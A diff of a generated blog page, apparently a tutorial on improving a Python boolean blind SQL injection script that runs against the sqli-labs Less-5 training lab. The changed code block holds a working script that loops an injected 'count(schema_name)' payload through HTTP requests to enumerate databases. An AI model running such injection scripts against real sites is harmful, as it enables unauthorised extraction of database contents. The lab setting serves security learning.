@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/mdKF3eAHC6.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/A3HEkh98aB.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/CJGgj0b8ga.png?imageslim">
-<meta property="og:updated_time" content="2018-06-06T04:47:15.705Z">
+<meta property="og:updated_time" content="2018-06-06T08:35:23.540Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python布尔盲注脚本算法完善">
 <meta name="twitter:description" content="python布尔盲注脚本算法完善完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找0-126这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在0-126这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时">
@@ -360,21 +360,8 @@
 </code></pre><p><strong>通过分析payload可以看出sqlmap将count查到的数据库个数使用cast转换为了字符型，然后指定二分法的范围为字符<code>&#39;0&#39;-&#39;9&#39;</code>，其ascii码转换为十进制也就是<code>48-57</code>，这个区域中间值为52，而看上面sqlmap在判断数据库个数时的第一个payload比较的值是51，所以可以确定sqlmap指定的二分法的大致范围确实是48-57(‘0’-‘9’)</strong></p>
 <p><strong>通过对sqlmap的payload的分析，我想到了一种解决之前那个问题的办法，由于查询个数、长度、记录数的结果一定为数字，那么不管这个数字有多大，只要转换为字符串后，它的每一位一定是在<code>&#39;0&#39;-&#39;9&#39;</code>这个范围内，也就是十进制的<code>48-57</code>，所以只需要把数字转换成字符串，然后去使用二分法，指定二分法的范围为<code>48-57</code>，之后通过二分法可以判断出数字字符串每一位的字符，直到不能判断为止，最终就能得到这个数字</strong></p>
 <h3 id="自增查找和二分查找算法对比"><a href="#自增查找和二分查找算法对比" class="headerlink" title="自增查找和二分查找算法对比"></a>自增查找和二分查找算法对比</h3><p><strong>和之前的自增查找做一个对比，首先以猜解数据库个数为例，我的数据库个数为5个</strong></p>
-<p><strong>在不确定二分法范围时采用的自增算法代码</strong></p>
-<pre><code>import requests
-url=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&quot;
-basehtml=requests.get(url=url).content
-i=0
-while 1:
-    payload=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&apos; and (select count(schema_name) from information_schema.schemata)=%d-- &quot;%(i)
-    html=requests.get(url=payload).content
-    print payload
-    if basehtml==html:
-        print i
-        break
-    else:
-        i=i+1
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/DDkGlAlEI1.png?imageslim" alt="mark"><br><strong>自增算法发送了5次payload判断出了数据库个数为5</strong></p>
+<p><strong>在不确定二分法范围时采用的自增算法代码</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select count(schema_name) from information_schema.schemata)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/DDkGlAlEI1.png?imageslim" alt="mark"><br><strong>自增算法发送了5次payload判断出了数据库个数为5</strong></p>
 <p><strong>再看一下刚刚说的二分查找算法代码</strong></p>
 <pre><code>import requests
 url=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&quot;
